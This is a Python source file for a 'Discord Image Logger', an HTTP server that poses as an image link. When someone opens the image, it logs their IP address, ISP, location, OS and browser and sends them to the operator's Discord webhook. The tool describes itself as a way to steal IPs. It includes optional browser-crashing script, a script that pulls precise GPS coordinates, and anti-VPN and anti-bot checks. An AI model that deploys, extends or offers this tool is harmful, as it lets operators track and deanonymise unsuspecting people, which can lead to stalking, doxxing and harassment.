# Discord Image Logger
# By Noctavia | https://github.com/Noctavia

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "Une application simple qui vous permet de voler des IP et plus encore en abusant de la fonctionnalité Open Original de Discord"
__version__ = "v2.0"
__author__ = "Noctavia"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/your/webhook",
    "image": "https://link-to-your-image.here", # Vous pouvez également avoir une image personnalisée en utilisant un argument URL
# (Par exemple, votresite.com/imagelogger?url=<Insérez ici un lien URL échappé vers une image>)
    "imageArgument": True, # Vous permet d'utiliser un argument URL pour modifier l'image (VOIR LE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Définissez ceci sur le nom que vous souhaitez donner au webhook
    "color": 0x00FFFF, # Couleur hexadécimale que vous souhaitez pour l'intégration (exemple : le rouge est 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Essaie de faire planter/geler le navigateur de l'utilisateur, peut ne pas fonctionner. (J'AI FAIT CELA, VOIR https://github.com/Noctavia/chromebook-crasher)
    
    "accurateLocation": False, # Utilise le GPS pour trouver l'emplacement exact des utilisateurs (adresse réelle, etc.) désactivé car il demande à l'utilisateur ce qui peut être suspect.

    "message": { # Afficher un message personnalisé lorsque l'utilisateur ouvre l'image
        "doMessage": False, # Activer le message personnalisé ?
        "message": "Ce navigateur a été piraté par Noctavia Image Logger. https://github.com/dekrypted/Image-logger-bot-discord", # Message à afficher
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1,# Empêche les VPN de déclencher l'alerte
# 0 = Pas d'anti-VPN
# 1 = Ne pas envoyer de ping lorsqu'un VPN est suspecté
# 2 = Ne pas envoyer d'alerte lorsqu'un VPN est suspecté

    "linkAlerts": True, # Alerte lorsque quelqu'un envoie le lien (peut ne pas fonctionner si le lien est envoyé plusieurs fois à quelques minutes d'intervalle)
    "buggedImage": True, # Affiche une image de chargement comme aperçu lorsqu'elle est envoyée dans Discord (peut simplement apparaître comme une image colorée aléatoire sur certains appareils)

    "antiBot": 1, # Empêche les robots de déclencher l'alerte
# 0 = Pas d'anti-bot
# 1 = Ne pas envoyer de ping lorsqu'il s'agit peut-être d'un robot
# 2 = Ne pas envoyer de ping lorsqu'il s'agit à 100 % d'un robot
# 3 = Ne pas envoyer d'alerte lorsqu'il s'agit peut-être d'un robot
# 4 = Ne pas envoyer d'alerte lorsqu'il s'agit à 100 % d'un robot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirection vers une page Web ?
        "page": "https://your-link.here" # Lien vers la page Web vers laquelle rediriger
    },

    # Please enter all values in correct format. Otherwise, it may break.
# Ne modifiez rien en dessous, à moins que vous ne sachiez ce que vous faites.
# REMARQUE : l'arborescence hiérarchique se présente comme suit :
# 1) Redirection (si cette option est activée, désactive l'image et fait planter le navigateur)
# 2) Crash du navigateur (si cette option est activée, désactive l'image)
# 3) Message (si cette option est activée, désactive l'image)
# 4) Image
}

blacklistedIPs = ("27", "104", "143", "164") # IP sur liste noire. Vous pouvez saisir une adresse IP complète ou le début pour bloquer un bloc entier.
# Cette fonctionnalité n'est pas documentée principalement parce qu'elle sert à mieux détecter les robots.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None  # Ne pas envoyer d'alerte si l'utilisateur l'a désactivée
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Contry:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # Ce n'est PAS un rat ou un virus, c'est juste une image de chargement. (Créé par moi ! :D)
# Si vous ne lui faites pas confiance, lisez le code ou ne l'utilisez pas du tout. Veuillez ne pas créer de problème en prétendant qu'il est dupliqué ou malveillant.
# Vous pouvez consulter l'extrait ci-dessous, qui sert simplement ces octets à tout client suspecté d'être un robot Discord.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI 
